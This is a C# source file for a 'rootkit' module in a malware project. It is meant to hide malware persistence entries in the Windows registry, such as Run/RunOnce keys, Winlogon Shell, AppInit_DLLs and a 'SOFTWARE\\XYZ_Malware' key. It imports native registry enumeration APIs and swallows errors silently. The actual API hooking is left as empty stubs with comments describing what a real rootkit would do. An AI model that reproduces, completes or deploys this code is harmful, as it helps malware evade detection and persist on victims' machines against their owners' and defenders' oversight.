using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Text; // Add this missing using directive

namespace XYZ.modules.rootkit
{
    public class RegistryHidingModule
    {
        // DLL imports for registry manipulation
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegEnumKeyEx(IntPtr hKey, uint dwIndex, StringBuilder lpName, ref uint lpcName, IntPtr lpReserved, IntPtr lpClass, IntPtr lpcClass, IntPtr lpftLastWriteTime);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegEnumValue(IntPtr hKey, uint dwIndex, StringBuilder lpValueName, ref uint lpcValueName, IntPtr lpReserved, IntPtr lpType, IntPtr lpData, IntPtr lpcbData);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegCloseKey(IntPtr hKey);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtEnumerateKey(IntPtr KeyHandle, uint Index, uint KeyInformationClass, IntPtr KeyInformation, uint Length, out uint ResultLength);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtEnumerateValueKey(IntPtr KeyHandle, uint Index, uint ValueInformationClass, IntPtr ValueInformation, uint Length, out uint ResultLength);

        // Registry key handles
        private static readonly IntPtr HKEY_CLASSES_ROOT = new IntPtr(-2147483648);
        private static readonly IntPtr HKEY_CURRENT_USER = new IntPtr(-2147483647);
        private static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(-2147483646);
        private static readonly IntPtr HKEY_USERS = new IntPtr(-2147483645);

        // Constants
        private const int KEY_READ = 0x20019;
        private const int KEY_WRITE = 0x20006;
        private const int KEY_ALL_ACCESS = 0xF003F;

        private List<string> hiddenRegistryKeys;
        private List<string> hiddenRegistryValues;
        private List<string> hiddenRegistryPatterns;
        private bool isHidingActive;

        public RegistryHidingModule()
        {
            hiddenRegistryKeys = new List<string>();
            hiddenRegistryValues = new List<string>();
            hiddenRegistryPatterns = new List<string>();
            isHidingActive = false;
        }

        public void HideRegistryKeys()
        {
            try
            {
                // Add common registry keys to hide
                HideRegistryKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsService");
                HideRegistryKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WindowsService");
                
                // Hide our own registry entries
                HideRegistryKey("SOFTWARE\\XYZ_Malware");
                
                isHidingActive = true;
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideRegistryKey(string keyPath)
        {
            try
            {
                // Mark a registry key to be hidden
                if (!hiddenRegistryKeys.Contains(keyPath))
                {
                    hiddenRegistryKeys.Add(keyPath);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideRegistryValue(string keyPath, string valueName)
        {
            try
            {
                // Mark a registry value to be hidden
                string fullValuePath = keyPath + "\\" + valueName;
                if (!hiddenRegistryValues.Contains(fullValuePath))
                {
                    hiddenRegistryValues.Add(fullValuePath);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void HideRegistryKeyPattern(string pattern)
        {
            try
            {
                // Hide registry keys matching a pattern
                if (!hiddenRegistryPatterns.Contains(pattern))
                {
                    hiddenRegistryPatterns.Add(pattern);
                }
                
                // This is a simplified implementation - in a real rootkit, this would hook registry APIs
                try
                {
                    // Check common registry locations
                    string[] registryHives = {
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
                        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs"
                    };

                    foreach (string hive in registryHives)
                    {
                        try
                        {
                            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(hive, true))
                            {
                                if (key != null)
                                {
                                    string[] valueNames = key.GetValueNames();
                                    foreach (string valueName in valueNames)
                                    {
                                        if (valueName.Contains(pattern))
                                        {
                                            HideRegistryValue(hive, valueName);
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            // Continue with other hives
                        }
                    }
                }
                catch (Exception)
                {
                    // Silent fail
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void UnhideRegistryKey(string keyPath)
        {
            try
            {
                // Remove a registry key from the hidden list
                hiddenRegistryKeys.Remove(keyPath);
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void UnhideRegistryValue(string keyPath, string valueName)
        {
            try
            {
                // Remove a registry value from the hidden list
                string fullValuePath = keyPath + "\\" + valueName;
                hiddenRegistryValues.Remove(fullValuePath);
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to check if a registry key is hidden
        public bool IsRegistryKeyHidden(string keyPath)
        {
            try
            {
                if (!isHidingActive)
                    return false;

                return hiddenRegistryKeys.Contains(keyPath);
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to check if a registry value is hidden
        public bool IsRegistryValueHidden(string keyPath, string valueName)
        {
            try
            {
                if (!isHidingActive)
                    return false;

                string fullValuePath = keyPath + "\\" + valueName;
                return hiddenRegistryValues.Contains(fullValuePath);
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to get all hidden registry keys
        public List<string> GetHiddenRegistryKeys()
        {
            return new List<string>(hiddenRegistryKeys);
        }

        // Method to get all hidden registry values
        public List<string> GetHiddenRegistryValues()
        {
            return new List<string>(hiddenRegistryValues);
        }

        // Method to add a registry key to hide
        public void AddRegistryKeyToHide(string keyPath)
        {
            try
            {
                if (!hiddenRegistryKeys.Contains(keyPath))
                {
                    hiddenRegistryKeys.Add(keyPath);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to add a registry value to hide
        public void AddRegistryValueToHide(string keyPath, string valueName)
        {
            try
            {
                string fullValuePath = keyPath + "\\" + valueName;
                if (!hiddenRegistryValues.Contains(fullValuePath))
                {
                    hiddenRegistryValues.Add(fullValuePath);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to add a registry pattern to hide
        public void AddRegistryPatternToHide(string pattern)
        {
            try
            {
                if (!hiddenRegistryPatterns.Contains(pattern))
                {
                    hiddenRegistryPatterns.Add(pattern);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove a registry pattern from hiding
        public void RemoveRegistryPatternFromHiding(string pattern)
        {
            try
            {
                hiddenRegistryPatterns.Remove(pattern);
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to check if a registry key matches any hidden pattern
        public bool IsRegistryKeyPatternHidden(string keyPath)
        {
            try
            {
                foreach (string pattern in hiddenRegistryPatterns)
                {
                    // Simple pattern matching (in a real implementation, you would use more sophisticated matching)
                    if (pattern.Contains("*") || pattern.Contains("?"))
                    {
                        // For demonstration, we'll do simple matching
                        string patternWithoutWildcard = pattern.Replace("*", "").Replace("?", "");
                        if (keyPath.Contains(patternWithoutWildcard))
                        {
                            return true;
                        }
                    }
                    else if (keyPath.Equals(pattern, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                return false;
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to hide registry keys using NtEnumerateKey hooking
        public void HideRegistryKeysUsingNtEnum()
        {
            try
            {
                // This would typically involve hooking NtEnumerateKey
                // and filtering out registry keys that match our hidden patterns
                // For demonstration, we'll just mark that this method was called
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to hide registry values using NtEnumerateValueKey hooking
        public void HideRegistryValuesUsingNtEnum()
        {
            try
            {
                // This would typically involve hooking NtEnumerateValueKey
                // and filtering out registry values that match our hidden patterns
                // For demonstration, we'll just mark that this method was called
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to enumerate and filter registry keys
        public void EnumerateAndFilterRegistryKeys(string keyPath)
        {
            try
            {
                IntPtr keyHandle;
                int result = RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, out keyHandle);
                
                if (result == 0) // ERROR_SUCCESS
                {
                    uint index = 0;
                    StringBuilder nameBuffer = new StringBuilder(255);
                    uint nameBufferSize = 255;
                    
                    while (true)
                    {
                        nameBufferSize = 255;
                        result = RegEnumKeyEx(keyHandle, index, nameBuffer, ref nameBufferSize, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                        
                        if (result == 0) // ERROR_SUCCESS
                        {
                            string subKeyName = nameBuffer.ToString();
                            string fullKeyPath = keyPath + "\\" + subKeyName;
                            
                            // Check if this key should be hidden
                            if (IsRegistryKeyHidden(fullKeyPath) || IsRegistryKeyPatternHidden(fullKeyPath))
                            {
                                // In a real implementation, you would modify the enumeration to skip this key
                                // This is a simplified approach for demonstration
                            }
                            
                            index++;
                        }
                        else
                        {
                            break; // No more keys
                        }
                    }
                    
                    RegCloseKey(keyHandle);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}